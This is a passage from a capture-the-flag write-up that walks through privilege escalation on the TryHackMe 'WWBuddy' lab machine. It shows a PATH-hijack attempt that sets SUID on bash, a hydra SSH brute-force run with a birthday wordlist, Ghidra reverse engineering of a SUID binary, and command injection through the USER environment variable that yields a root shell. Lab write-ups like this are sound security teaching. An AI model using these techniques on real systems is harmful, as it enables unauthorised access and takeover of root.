groups | grep developer
You are already a developer.
USER
Group updated
newgrp developer
[...]
```

```
$ /bin/authenticate
roberto developer
You are already a developer.
```

In that binary, it seems like if we're not in the `developer` group, it'll add a new group to `developer`. Otherwise, it'll execute `groups | grep developer`.

**However, the `groups`, `grep`, and `newgrp` command is using relative path, which is can be abused to escalate to root!**

To do so, I'll:

- **Create a new `PATH` environment variable to `/tmp`:**

```
$ cd /tmp
$ export PATH=/tmp:$PATH
```

- Create a malicious `groups` Bash script:

```
$ cat << EOF > groups
> chmod +s /bin/bash
> EOF
$ chmod +x groups
```

- Execute the `/bin/authenticate` binary:

```
$ /bin/authenticate
chmod: changing permissions of '/bin/bash': Operation not permitted
Group updated
```

Hmm...

Let's take a step back.

In our home directory, we saw `importante.txt` file.

**`/home/roberto/importante.txt`:**
```
Jenny will be very happy when she finds out she's been hired :DD

Don't forget that next week she turns 26, when she sees the present I bought her, maybe she'll even be excited to go on a date with me.
```

And in the web application's roberto chat box, his said: "The default password for their accounts in SSH is employee's birthday."

Armed with above information, **we can brute force `jenny`'s password.**

**`jenny` home directory:**
```
$ ls -lah /home
[...]
drwx------  2 jenny   jenny   4.0K Jul 27  2020 jenny
[...]
```

```
$ ls -lah /home/roberto/importante.txt
-rw-rw-r-- 1 roberto roberto 246 Jul 27  2020 /home/roberto/importante.txt
```

As you can see, both of them are created at `07/27/2020`. So `jenny` birthday is at around `08/xx/1994`.

**Let's write a python script to create a wordlist:**
```py
#!/usr/bin/env python3

def main():
    for day in range(1, 32):
        for month in range(7, 9):
            brithday = f'{month:02d}/{day:02d}/1994'

            with open('wordlist_brithday.txt', 'a') as fd:
                fd.write(f'{brithday}\n')



if __name__ == '__main__':
    main()
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/WWBuddy]
└─# python3 create_wordlist.py

┌──(root🌸siunam)-[~/ctf/thm/ctf/WWBuddy]
└─# head -n 5 wordlist_brithday.txt 
07/01/1994
08/01/1994
07/02/1994
08/02/1994
07/03/1994
```

**Then use `hydra` to brute force user `jenny` SSH password:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/WWBuddy]
└─# hydra -l 'jenny' -P wordlist_brithday.txt ssh://$RHOSTS
[...]
[22][ssh] host: 10.10.94.193   login: jenny   password: {Redacted}
```

Found it!

**Let's SSH into user `jenny`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/WWBuddy]
└─# ssh jenny@$RHOSTS      
jenny@10.10.94.193's password: 
[...]
$ whoami;hostname;id;ip a
jenny
wwbuddy
uid=1002(jenny) gid=1002(jenny) groups=1002(jenny)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:be:79:84:16:8b brd ff:ff:ff:ff:ff:ff
    inet 10.10.94.193/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 3082sec preferred_lft 3082sec
    inet6 fe80::be:79ff:fe84:168b/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm user `jenny`!

### jenny to root

**Now, let's transfer the `/bin/authenticate` binary, and then use Ghidra to reverse engineer it!**
```
$ cd /bin
$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

┌──(root🌸siunam)-[~/ctf/thm/ctf/WWBuddy]
└─# wget http://$RHOSTS:8000/authenticate
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/WWBuddy]
└─# ghidra
```

**Function `main()`:**
```c
undefined8 main(void)

{
  __uid_t _Var1;
  int iVar2;
  char *__src;
  long in_FS_OFFSET;
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined4 local_20;
  undefined local_1c;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  _Var1 = getuid();
  if ((int)_Var1 < 1000) {
    puts("You need to be a real user to be authenticated.");
  }
  else {
    iVar2 = system("groups | grep developer");
    if (iVar2 == 0) {
      puts("You are already a developer.");
    }
    else {
      __src = getenv("USER");
      _Var1 = getuid();
      setuid(0);
      local_48 = 0x20646f6d72657375; /* usermod */
      local_40 = 0x6c6576656420472d; /* -G devel */
      local_38 = 0x207265706f; /* oper */
      local_30 = 0;
      local_28 = 0;
      local_20 = 0;
      local_1c = 0;
      strncat((char *)&local_48,__src,0x14);
      system((char *)&local_48);
      puts("Group updated");
      setuid(_Var1);
      system("newgrp developer");
    }
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

**As you can see, this binary will:**

- If UID is less than 1000, then we need to be a real user.
    - Otherwise, execute command `groups | grep developer`. If `developer` exist, then return `You are already a developer.`
    - Otherwise, **`__src` = environment varible `USER`, enable SUID stick bit, then execute command `usermod -G developer <USER>`**

**Armed with above information, we can exploit OS command injection:**
```
$ export USER="$USER;bash"
```

**Then execute `/bin/authenticate`:**
```
$ /bin/authenticate

root@wwbuddy:~# whoami;hostname;id;ip a
root
wwbuddy
uid=0(root) gid=1002(jenny) groups=1002(jenny)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:a7:ab:83:83:c7 brd ff:ff:ff:ff:ff:ff
    inet 10.10.94.193/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 3497sec preferred_lft 3497sec
    inet6 fe80::a7:abff:fe83:83c7/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm root! :D

## Rooted

**root.txt:**
```
root@wwbuddy:~# cat /root/root.txt
THM{Redacted}
```

# Conclusion

What we've learned:

1. Enumerating Hidden Directories and Files via `gobuster`
2. Enumerating Usernames via Different Login Error Response
3. Exploiting Second Order SQL Injection
4. Exploiting LFI (Local File Inclusion) RCE (Remote Code Execution) via Log Poisoning
5. Horizontal Privilege Escalation via Finding Plaintext Password in MySQL Log File
6. Horizontal Privilege Escalation via Brute Forcing Password via `hydra`
7. Vertical Privilege Escalation via Exploiting SUID Binary and Modifying Environment Variable